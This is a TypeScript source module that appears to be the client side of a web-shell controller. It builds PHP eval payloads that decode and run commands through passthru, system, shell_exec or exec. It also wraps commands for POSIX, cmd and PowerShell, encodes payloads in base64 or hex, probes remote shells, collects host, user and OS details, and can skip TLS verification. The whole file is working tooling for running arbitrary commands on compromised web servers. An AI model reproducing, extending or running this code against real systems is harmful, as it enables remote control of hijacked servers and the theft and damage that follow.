import crypto from 'crypto';
import http from 'http';
import https from 'https';
import type {
  ShellFlavor,
  WebShellCommandMode,
  WebShellProfileOptions,
  WebShellPayloadEncoder,
  WebShellResponseEncoding,
  WebShellResolvedRuntime,
  WebShellSystemInfo,
} from '../contracts/shell';
import {
  WEBSHELL_COMMAND_BASE64_PLACEHOLDER,
  WEBSHELL_COMMAND_PLACEHOLDER,
} from '../contracts/shell';

export const MAX_WEBSHELL_RESPONSE_BYTES = 4 * 1024 * 1024;

export interface WebShellHttpResponse {
  statusCode: number;
  headers: http.IncomingHttpHeaders;
  body: string;
}

export interface WebShellCommandResult {
  output: string;
  exitCode?: number;
  cwd: string;
}

export interface WebShellRuntime {
  flavor: Exclude<ShellFlavor, 'auto' | 'raw'>;
  commandMode: Exclude<WebShellCommandMode, 'auto'>;
  resolved: WebShellResolvedRuntime;
  cwd: string;
  inputBuffer: string;
  history: string[];
  historyIndex: number;
  activeAbort?: AbortController;
  activeHumanCommand?: string;
}

export function buildWebShellPayload(
  mode: Exclude<WebShellCommandMode, 'auto'>,
  osCommand: string,
) {
  if (mode === 'os') return osCommand;
  const encoded = Buffer.from(osCommand, 'utf8').toString('base64');
  return [
    `$c=base64_decode('${encoded}');`,
    `if(function_exists('passthru')){passthru($c);}`,
    `elseif(function_exists('system')){system($c);}`,
    `elseif(function_exists('shell_exec')){echo shell_exec($c);}`,
    `elseif(function_exists('exec')){$o=array();$r=0;exec($c,$o,$r);echo implode("\\n",$o);}`,
  ].join('');
}

export function buildWebShellCommand(flavor: Exclude<ShellFlavor, 'auto' | 'raw'>, command: string, cwd: string, nonce: string) {
  const begin = `${nonce}:0`;
  const end = `${nonce}:1`;
  const statusVariable = `r_${nonce}`;
  const quotedCwd = flavor === 'posix' ? quotePosix(cwd) : flavor === 'powershell' ? quotePowerShell(cwd) : quoteCmd(cwd);
  const normalized = command.replace(/\r?\n/g, ' ');
  if (flavor === 'powershell') {
    const safeCommand = normalized;
    return [
      `& { Set-Location -LiteralPath '${quotedCwd}'; Write-Output '${begin}';`,
      `try { & { ${safeCommand} }; $${statusVariable} = if ($null -ne $LASTEXITCODE) { $LASTEXITCODE } elseif ($?) { 0 } else { 1 } }`,
      `catch { $_ | Out-String; $${statusVariable} = 1 }`,
      `$next = (Get-Location).Path; Write-Output ("${end}:$${statusVariable}:$next") }`,
    ].join(' ');
  }
  if (flavor === 'cmd') {
    return [
      `setlocal EnableDelayedExpansion & cd /d ${quotedCwd} & echo ${begin} &`,
      `${normalized} & set "${statusVariable}=!errorlevel!" &`,
      `for /f "delims=" %A in ('cd') do @echo ${end}:!${statusVariable}!:%A`,
    ].join(' ');
  }
  return [
    `{ cd ${quotedCwd} || exit 126; printf '\\n${begin}\\n';`,
    `{ ${normalized}; }; ${statusVariable}=$?; printf '\\n${end}:%s:%s\\n' "$${statusVariable}" "$PWD"; }`,
  ].join(' ');
}

export function parseWebShellCommand(body: string, nonce: string): WebShellCommandResult {
  const begin = `${nonce}:0`;
  const end = `${nonce}:1:`;
  const beginIndex = body.indexOf(begin);
  if (beginIndex < 0) {
    throw new Error('WebShell response did not contain the command marker; the endpoint must execute the rendered OS command and return its output (language eval templates should decode {{command_base64}} before execution)');
  }
  const outputStart = beginIndex + begin.length;
  const endIndex = body.indexOf(end, outputStart);
  if (endIndex < 0) throw new Error('WebShell response did not contain the completion marker');
  const metadataStart = endIndex + end.length;
  const lineEnd = body.indexOf('\n', metadataStart);
  const metadata = body.slice(metadataStart, lineEnd < 0 ? body.length : lineEnd).replace(/\r$/, '');
  const separator = metadata.indexOf(':');
  if (separator < 1) throw new Error('WebShell completion marker is malformed');
  const exitCode = Number(metadata.slice(0, separator));
  const cwd = metadata.slice(separator + 1);
  if (!Number.isInteger(exitCode) || !cwd) throw new Error('WebShell completion marker is incomplete');
  const output = body.slice(outputStart, endIndex).replace(/^\r?\n/, '').replace(/\r?\n$/, '');
  return { output, exitCode, cwd };
}

export function extractWebShellResponse(body: string, options: WebShellProfileOptions) {
  if (options.responseExtract === 'body') return body;
  if (options.responseExtract === 'between') {
    const start = options.responseStart ?? '';
    const end = options.responseEnd ?? '';
    const startIndex = body.indexOf(start);
    if (startIndex < 0) throw new Error('WebShell response start delimiter was not found');
    const contentStart = startIndex + start.length;
    const endIndex = body.indexOf(end, contentStart);
    if (endIndex < 0) throw new Error('WebShell response end delimiter was not found');
    return body.slice(contentStart, endIndex);
  }
  const expression = new RegExp(options.responseRegex ?? '', 's');
  const match = expression.exec(body);
  if (!match || match.length < 2) throw new Error('WebShell response regex did not capture output');
  return match[1];
}

export async function executeWebShellCommand(
  options: WebShellProfileOptions,
  commandMode: Exclude<WebShellCommandMode, 'auto'>,
  flavor: Exclude<ShellFlavor, 'auto' | 'raw'>,
  command: string,
  cwd: string,
  signal: AbortSignal,
  timeoutMs: number,
  payloadEncoder: WebShellPayloadEncoder = 'raw',
): Promise<WebShellCommandResult> {
  const nonce = createWebShellProtocolNonce();
  const wrapped = buildWebShellCommand(flavor, command, cwd, nonce);
  const request = buildRequest(options, encodeWebShellPayload(buildWebShellPayload(commandMode, wrapped), payloadEncoder));
  const response = await requestHttp(request, signal, timeoutMs, options.allowInvalidTls, options.responseEncoding);
  const logicalBody = extractWebShellResponse(response.body, options);
  return parseWebShellCommand(logicalBody, nonce);
}

export async function probeWebShell(
  options: WebShellProfileOptions,
  flavor: Exclude<ShellFlavor, 'auto' | 'raw'>,
  timeoutMs: number,
  preferredMode?: Exclude<WebShellCommandMode, 'auto'>,
  payloadEncoder: WebShellPayloadEncoder = 'raw',
): Promise<{ flavor: Exclude<ShellFlavor, 'auto' | 'raw'>; commandMode: Exclude<WebShellCommandMode, 'auto'>; cwd: string }> {
  const configured = options.commandMode ?? 'auto';
  const supportedModes: Array<Exclude<WebShellCommandMode, 'auto'>> = configured === 'auto'
    ? (usesBase64Placeholder(options) ? ['os'] : ['os', 'php_eval'])
    : [configured];
  const modes = preferredMode && supportedModes.includes(preferredMode)
    ? [preferredMode, ...supportedModes.filter((mode) => mode !== preferredMode)]
    : supportedModes;
  let lastError: unknown = new Error('WebShell command mode probe failed');
  for (const commandMode of modes) {
    const nonce = createWebShellProtocolNonce();
    const challenge = `${nonce}:2`;
    const probe = flavor === 'powershell' ? `Write-Output "${challenge}"` : flavor === 'cmd' ? `echo ${challenge}` : `printf '${challenge}\\n'`;
    const wrapped = buildWebShellCommand(flavor, probe, flavor === 'powershell' ? 'C:\\' : flavor === 'cmd' ? 'C:\\' : '/', nonce);
    const request = buildRequest(options, encodeWebShellPayload(buildWebShellPayload(commandMode, wrapped), payloadEncoder));
    try {
      const response = await requestHttp(request, new AbortController().signal, timeoutMs, options.allowInvalidTls, options.responseEncoding);
      const logicalBody = extractWebShellResponse(response.body, options);
      const result = parseWebShellCommand(logicalBody, nonce);
      if (!result.output.includes(challenge)) throw new Error('WebShell probe marker was not returned');
      return { flavor, commandMode, cwd: result.cwd };
    } catch (error) {
      lastError = error;
    }
  }
  throw lastError;
}

export function encodeWebShellPayload(payload: string, encoder: WebShellPayloadEncoder) {
  if (encoder === 'base64') return Buffer.from(payload, 'utf8').toString('base64');
  if (encoder === 'hex') return Buffer.from(payload, 'utf8').toString('hex');
  return payload;
}

export function buildSystemInfoCommand(flavor: Exclude<ShellFlavor, 'auto' | 'raw'>, nonce: string) {
  const os = `${nonce}:3:0:`;
  const hostname = `${nonce}:3:1:`;
  const user = `${nonce}:3:2:`;
  const cwd = `${nonce}:3:3:`;
  const runtime = `${nonce}:3:4:`;
  const runtimeVariable = `r_${nonce}`;
  if (flavor === 'powershell') {
    return [
      `Write-Output ('${os}' + [System.Environment]::OSVersion.VersionString);`,
      `Write-Output ('${hostname}' + $env:COMPUTERNAME);`,
      `Write-Output ('${user}' + $env:USERNAME);`,
      `Write-Output ('${cwd}' + (Get-Location).Path);`,
      `$${runtimeVariable} = '';`,
      `if (Get-Command php -ErrorAction SilentlyContinue) { $${runtimeVariable} = (php -r 'echo PHP_VERSION;') };`,
      `Write-Output ('${runtime}' + $${runtimeVariable})`,
    ].join(' ');
  }
  if (flavor === 'cmd') {
    return [
      `echo ${os}%OS%`,
      `echo ${hostname}%COMPUTERNAME%`,
      `echo ${user}%USERNAME%`,
      `echo ${cwd}%CD%`,
      `for /f "delims=" %A in ('php -r "echo PHP_VERSION;" 2^>nul') do @echo ${runtime}%A`,
    ].join(' & ');
  }
  return [
    `printf '${os}%s\\n' "$(uname -a)";`,
    `printf '${hostname}%s\\n' "$(hostname)";`,
    `printf '${user}%s\\n' "$(id -un 2>/dev/null || whoami)";`,
    `printf '${cwd}%s\\n' "$PWD";`,
    `printf '${runtime}%s\\n' "$(php -r 'echo PHP_VERSION;' 2>/dev/null || true)"`,
  ].join(' ');
}

export function parseSystemInfoOutput(output: string, nonce: string): WebShellSystemInfo {
  const info: WebShellSystemInfo = {};
  const prefix = `${nonce}:3:`;
  for (const line of output.split(/\r?\n/)) {
    const normalized = line.trim();
    if (!normalized.startsWith(prefix)) continue;
    const separator = normalized.indexOf(':', prefix.length);
    if (separator < 0) continue;
    const field = normalized.slice(prefix.length, separator);
    const value = normalized.slice(separator + 1).trim();
    if (!value) continue;
    switch (field) {
      case '0': info.os = value; break;
      case '1': info.hostname = value; break;
      case '2': info.user = value; break;
      case '3': info.cwd = value; break;
      case '4': info.runtimeVersion = value; break;
    }
  }
  return info;
}

export function buildRequest(options: WebShellProfileOptions, command: string) {
  const url = replaceCommand(options.url, command, 'encoded');
  const headers = Object.fromEntries(options.headers.map(({ name, value }) => [name, value]));
  let body: string | undefined;
  if (options.bodyKind !== 'none') {
    const template = options.bodyTemplate ?? '';
    if (options.bodyKind === 'form') {
      body = replaceCommand(template, command, 'encoded');
      if (!hasHeader(headers, 'content-type')) headers['Content-Type'] = 'application/x-www-form-urlencoded';
    } else if (options.bodyKind === 'json') {
      body = replaceCommand(template, command, 'json');
      if (!hasHeader(headers, 'content-type')) headers['Content-Type'] = 'application/json';
    } else {
      body = replaceCommand(template, command, 'raw');
    }
  }
  return { url, method: options.method, headers, body };
}

function requestHttp(
  request: { url: string; method: string; headers: Record<string, string>; body?: string },
  signal: AbortSignal,
  timeoutMs: number,
  allowInvalidTls: boolean,
  responseEncoding: WebShellResponseEncoding,
): Promise<WebShellHttpResponse> {
  return new Promise((resolve, reject) => {
    let parsed: URL;
    try { parsed = new URL(request.url); } catch { reject(new Error('WebShell URL is invalid')); return; }
    const transport = parsed.protocol === 'https:' ? https : parsed.protocol === 'http:' ? http : undefined;
    if (!transport) { reject(new Error('WebShell URL must use HTTP or HTTPS')); return; }
    let settled = false;
    const settle = (error?: Error, value?: WebShellHttpResponse) => {
      if (settled) return;
      settled = true;
      error ? reject(error) : resolve(value!);
    };
    const req = transport.request({
      protocol: parsed.protocol,
      hostname: parsed.hostname,
      port: parsed.port || undefined,
      path: `${parsed.pathname}${parsed.search}`,
      method: request.method,
      headers: {
        ...request.headers,
        ...(request.body ? { 'Content-Length': Buffer.byteLength(request.body, 'utf8') } : {}),
      },
      ...(parsed.protocol === 'https:' ? { rejectUnauthorized: !allowInvalidTls, servername: parsed.hostname } : {}),
    }, (response) => {
      if (response.statusCode && response.statusCode >= 300 && response.statusCode < 400) {
        response.resume();
        settle(new Error(`WebShell redirects are not followed (HTTP ${response.statusCode})`));
        return;
      }
      if (!response.statusCode || response.statusCode < 200 || response.statusCode >= 300) {
        response.resume();
        settle(new Error(`WebShell returned HTTP ${response.statusCode ?? 'unknown'}`));
        return;
      }
      const chunks: Buffer[] = [];
      let total = 0;
      response.on('data', (chunk: Buffer) => {
        total += chunk.byteLength;
        if (total > MAX_WEBSHELL_RESPONSE_BYTES) {
          req.destroy(new Error('WebShell response exceeds 4 MiB'));
          return;
        }
        chunks.push(chunk);
      });
      response.on('end', () => settle(undefined, {
        statusCode: response.statusCode!,
        headers: response.headers,
        body: decodeBody(Buffer.concat(chunks), response.headers['content-type'], responseEncoding),
      }));
      response.on('error', (error) => settle(error));
    });
    const timeout = setTimeout(() => req.destroy(new Error('WebShell request timed out')), timeoutMs);
    const abort = () => req.destroy(new Error('WebShell request was aborted'));
    signal.addEventListener('abort', abort, { once: true });
    req.on('error', (error) => settle(error));
    req.on('close', () => {
      clearTimeout(timeout);
      signal.removeEventListener('abort', abort);
    });
    if (request.body) req.write(request.body);
    req.end();
  });
}

function replaceCommand(template: string, command: string, mode: 'encoded' | 'json' | 'raw') {
  const marker = template.includes(WEBSHELL_COMMAND_BASE64_PLACEHOLDER)
    ? WEBSHELL_COMMAND_BASE64_PLACEHOLDER
    : WEBSHELL_COMMAND_PLACEHOLDER;
  const transformed = marker === WEBSHELL_COMMAND_BASE64_PLACEHOLDER
    ? Buffer.from(command, 'utf8').toString('base64')
    : command;
  const replacement = mode === 'encoded'
    ? encodeURIComponent(transformed)
    : mode === 'json' ? JSON.stringify(transformed) : transformed;
  return template.replace(marker, replacement);
}

function hasHeader(headers: Record<string, string>, name: string) {
  return Object.keys(headers).some((candidate) => candidate.toLowerCase() === name);
}

function usesBase64Placeholder(options: WebShellProfileOptions) {
  return `${options.url}${options.bodyTemplate ?? ''}`.includes(WEBSHELL_COMMAND_BASE64_PLACEHOLDER);
}

function decodeBody(value: Buffer, contentType: string | string[] | undefined, override: WebShellResponseEncoding) {
  const header = Array.isArray(contentType) ? contentType[0] : contentType;
  const charset = override === 'auto' ? header?.match(/charset=([^;\s]+)/i)?.[1] ?? 'utf-8' : override;
  try { return new TextDecoder(charset).decode(value); } catch { return new TextDecoder('utf-8').decode(value); }
}

function quotePosix(value: string) { return `'${value.replace(/'/g, `'\\''`)}'`; }
function quotePowerShell(value: string) { return value.replace(/'/g, "''"); }
function quoteCmd(value: string) { return `"${value.replace(/"/g, '""')}"`; }
export function createWebShellProtocolNonce() { return crypto.randomBytes(16).toString('hex'); }
